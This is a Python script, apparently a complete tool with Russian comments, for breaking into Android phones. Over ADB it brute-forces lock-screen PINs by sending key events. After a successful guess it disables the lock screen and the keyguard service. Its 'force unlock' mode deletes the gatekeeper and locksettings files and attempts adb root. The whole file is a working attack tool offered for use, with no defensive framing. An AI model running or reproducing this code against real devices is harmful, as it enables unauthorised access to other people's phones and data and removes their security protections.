import subprocess
import time
import itertools
import string
import threading
from datetime import datetime

class PhoneLockBypass:
    def __init__(self, code_length=4):
        self.code_length = code_length
        self.attempts = 0
        self.max_attempts = 1000
        self.found_code = None
        self.is_android = self.detect_android()
        
    def detect_android(self):
        """Определяет, подключено ли Android устройство"""
        try:
            result = subprocess.run(['adb', 'devices'], 
                                  capture_output=True, text=True, timeout=10)
            return 'device' in result.stdout
        except:
            return False
    
    def setup_adb(self):
        """Настраивает ADB соединение"""
        try:
            # Перезапуск ADB сервера
            subprocess.run(['adb', 'kill-server'], capture_output=True)
            subprocess.run(['adb', 'start-server'], capture_output=True)
            time.sleep(2)
            
            # Проверка подключения
            result = subprocess.run(['adb', 'devices'], 
                                  capture_output=True, text=True)
            if 'device' in result.stdout:
                print("Android device connected via ADB")
                return True
            else:
                print("No Android device detected")
                return False
        except Exception as e:
            print(f"ADB setup failed: {e}")
            return False
    
    def generate_pin_codes(self, length):
        """Генерирует все возможные PIN коды заданной длины"""
        digits = string.digits
        return [''.join(pin) for pin in itertools.product(digits, repeat=length)]
    
    def send_keyevent(self, keycode):
        """Отправляет ADB команду нажатия клавиши"""
        try:
            subprocess.run(['adb', 'shell', 'input', 'keyevent', str(keycode)], 
                         capture_output=True, timeout=5)
            return True
        except:
            return False
    
    def input_pin_via_adb(self, pin):
        """Вводит PIN код через ADB"""
        try:
            # Активируем экран блокировки
            self.send_keyevent(26)  # POWER
            time.sleep(0.5)
            
            # Вводим цифры PIN кода
            for digit in pin:
                keycode = 7 + int(digit)  # KEYCODE_0 = 7, KEYCODE_1 = 8, etc.
                self.send_keyevent(keycode)
                time.sleep(0.1)
            
            # Нажимаем ENTER для проверки
            self.send_keyevent(66)  # ENTER
            time.sleep(1)
            
            return True
        except Exception as e:
            print(f"Input failed for PIN {pin}: {e}")
            return False
    
    def check_unlock_success(self):
        """Проверяет, разблокирован ли телефон"""
        try:
            result = subprocess.run(['adb', 'shell', 'dumpsys', 'window'], 
                                  capture_output=True, text=True, timeout=10)
            
            # Проверяем состояние экрана
            if 'mDreamingLockscreen=true' in result.stdout:
                return False  # Все еще заблокирован
            elif 'mCurrentFocus' in result.stdout and 'Launcher' in result.stdout:
                return True   # Разблокирован
            else:
                # Альтернативная проверка через getprop
                result = subprocess.run(['adb', 'shell', 'getprop', 'sys.boot_completed'], 
                                      capture_output=True, text=True)
                return '1' in result.stdout
        except:
            return False
    
    def brute_force_pin(self):
        """Основная функция подбора PIN кода"""
        if not self.setup_adb():
            print("Failed to establish ADB connection")
            return None
        
        print(f"Starting PIN brute force attack (length: {self.code_length})")
        print(f"Total possible combinations: {10**self.code_length}")
        
        pin_list = self.generate_pin_codes(self.code_length)
        
        for pin in pin_list:
            if self.attempts >= self.max_attempts:
                print(f"Reached maximum attempts: {self.max_attempts}")
                break
                
            self.attempts += 1
            print(f"Attempt {self.attempts}: Trying PIN {pin}")
            
            if self.input_pin_via_adb(pin):
                time.sleep(2)  # Ждем обработки
                
                if self.check_unlock_success():
                    self.found_code = pin
                    print(f"SUCCESS! Phone unlocked with PIN: {pin}")
                    self.disable_lock_security()
                    return pin
                else:
                    # Очищаем поле ввода после неудачной попытки
                    self.send_keyevent(4)  # BACK button to clear
                    time.sleep(0.5)
        
        print("PIN not found within attempt limit")
        return None
    
    def disable_lock_security(self):
        """Отключает систему блокировки после успешного входа"""
        try:
            print("Disabling lock screen security...")
            
            # Удаление блокировки через settings
            commands = [
                'locksettings set-disabled true',
                'settings put secure lock_screen_lock_after_timeout 0',
                'settings put secure lock_screen_lock_immediately 0',
                'pm disable com.android.systemui/.keyguard.KeyguardService'
            ]
            
            for cmd in commands:
                try:
                    subprocess.run(['adb', 'shell', cmd], 
                                 capture_output=True, timeout=5)
                    print(f"Executed: {cmd}")
                except:
                    continue
            
            # Для Android 10+ - дополнительные команды
            additional_cmds = [
                'settings put global device_provisioned 1',
                'settings put secure user_setup_complete 1'
            ]
            
            for cmd in additional_cmds:
                try:
                    subprocess.run(['adb', 'shell', cmd], 
                                 capture_output=True, timeout=5)
                except:
                    continue
            
            print("Lock screen security disabled")
            
        except Exception as e:
            print(f"Error disabling security: {e}")
    
    def force_unlock_methods(self):
        """Альтернативные методы принудительной разблокировки"""
        print("Trying force unlock methods...")
        
        # Метод 1: Через service call
        try:
            subprocess.run(['adb', 'shell', 'service call activity 42 s16 com.android.settings'], 
                         capture_output=True)
            time.sleep(2)
        except:
            pass
        
        # Метод 2: Удаление файлов блокировки
        lock_files = [
            '/data/system/gatekeeper.password.key',
            '/data/system/gatekeeper.pattern.key',
            '/data/system/locksettings.db',
            '/data/system/locksettings.db-wal',
            '/data/system/locksettings.db-shm'
        ]
        
        for lock_file in lock_files:
            try:
                subprocess.run(['adb', 'shell', 'rm', '-f', lock_file], 
                             capture_output=True)
                print(f"Attempted to remove: {lock_file}")
            except:
                continue
        
        # Метод 3: Сброс через recovery (требует root)
        try:
            subprocess.run(['adb', 'root'], capture_output=True, timeout=10)
            time.sleep(2)
            subprocess.run(['adb', 'remount'], capture_output=True, timeout=10)
        except:
            pass

def main():
    print("Phone Lock Bypass System")
    print("=" * 50)
    
    try:
        code_length = int(input("Enter PIN code length (4-8): "))
        if code_length < 4 or code_length > 8:
            print("Invalid length. Using default (4)")
            code_length = 4
    except:
        code_length = 4
    
    bypass = PhoneLockBypass(code_length)
    
    print("\nSelect method:")
    print("1. Brute Force PIN")
    print("2. Force Unlock (Advanced)")
    print("3. Combined Attack")
    
    choice = input("Enter choice (1-3): ")
    
    if choice == "1":
        result = bypass.brute_force_pin()
    elif choice == "2":
        bypass.force_unlock_methods()
        result = "Force unlock attempted"
    elif choice == "3":
        # Комбинированная атака
        result = bypass.brute_force_pin()
        if not result:
            print("Brute force failed, trying force unlock...")
            bypass.force_unlock_methods()
            result = "Combined attack completed"
    else:
        result = bypass.brute_force_pin()
    
    print(f"\nFinal result: {result}")
    
    if bypass.found_code:
        print(f"Phone successfully unlocked with PIN: {bypass.found_code}")
        print("Lock screen security has been disabled")

if __name__ == "__main__":
    main()
